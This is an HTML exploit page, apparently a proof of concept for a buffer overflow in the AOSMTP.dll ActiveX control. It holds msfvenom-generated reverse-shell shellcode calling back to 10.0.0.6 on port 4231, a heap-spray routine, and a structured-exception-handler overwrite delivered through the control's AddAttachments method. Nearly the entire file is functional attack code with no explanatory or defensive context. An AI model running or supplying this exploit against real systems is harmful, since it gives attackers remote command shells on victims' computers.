<!-- Created by: Jb05s >< Purpose: AOSMTP.dll ActiveX -->
<!-- CLSID Location: '\HKEY_CLASSES_ROOT\AOSMTP.Mail\CLSID' -->
<html>
<object classid='clsid:F8D07B72-B4B4-46A0-ACC0-C771D4614B82' id='target' ></object>
<script>

<!-- msfvenom -p windows/shell_reverse_tcp lhost=10.0.0.6 lport=4231 -f js_le (Payload size: 324 bytes) -->

shellcode = unescape('%ue8fc%u0082%u0000%u8960%u31e5%u64c0%u508b%u8b30%u0c52%u528b%u8b14%u2872');
shellcode += unescape('%ub70f%u264a%uff31%u3cac%u7c61%u2c02%uc120%u0dcf%uc701%uf2e2%u5752%u528b');
shellcode += unescape('%u8b10%u3c4a%u4c8b%u7811%u48e3%ud101%u8b51%u2059%ud301%u498b%ue318%u493a');
shellcode += unescape('%u348b%u018b%u31d6%uacff%ucfc1%u010d%u38c7%u75e0%u03f6%uf87d%u7d3b%u7524');
shellcode += unescape('%u58e4%u588b%u0124%u66d3%u0c8b%u8b4b%u1c58%ud301%u048b%u018b%u89d0%u2444');
shellcode += unescape('%u5b24%u615b%u5a59%uff51%u5fe0%u5a5f%u128b%u8deb%u685d%u3233%u0000%u7768');
shellcode += unescape('%u3273%u545f%u4c68%u2677%uff07%ub8d5%u0190%u0000%uc429%u5054%u2968%u6b80');
shellcode += unescape('%uff00%u50d5%u5050%u4050%u4050%u6850%u0fea%ue0df%ud5ff%u6a97%u6805%u0a80');
shellcode += unescape('%u6b01%u0268%u1000%u8987%u6ae6%u5610%u6857%ua599%u6174%ud5ff%uc085%u0c74');
shellcode += unescape('%u4eff%u7508%u68ec%ub5f0%u56a2%ud5ff%u6368%u646d%u8900%u57e3%u5757%uf631');
shellcode += unescape('%u126a%u5659%ufde2%uc766%u2444%u013c%u8d01%u2444%uc610%u4400%u5054%u5656');
shellcode += unescape('%u4656%u4e56%u5656%u5653%u7968%u3fcc%uff86%u89d5%u4ee0%u4656%u30ff%u0868');
shellcode += unescape('%u1d87%uff60%ubbd5%ub5f0%u56a2%ua668%ubd95%uff9d%u3cd5%u7c06%u800a%ue0fb');
shellcode += unescape('%u0575%u47bb%u7213%u6a6f%u5300%ud5ff');

nops = unescape('%u9090%u9090');

headerSize = 20;
slackspace = headerSize + shellcode.length;

while(nops.length < slackspace) nops += nops;
fillBlock = nops.substring(0, slackspace);

block = nops.substring(0, nops.length - slackspace);
while (block.length + slackspace < 0x50000) block = block + block + fillBlock;

memory = new Array();
for (i = 0; i < 250; i++) memory[i] = block + shellcode;

alert("Spray done.");

pre = "";
while(pre.length < 272) pre += "C";

ret = "\xff\xff\xff\xff";
filler = "BBBBBBBB";
nseh = "AAAA";
seh = "\x06\x06\x06\x06";

payload = pre + ret + filler + nseh + seh;

target.AddAttachments(payload);

</script>
</html>
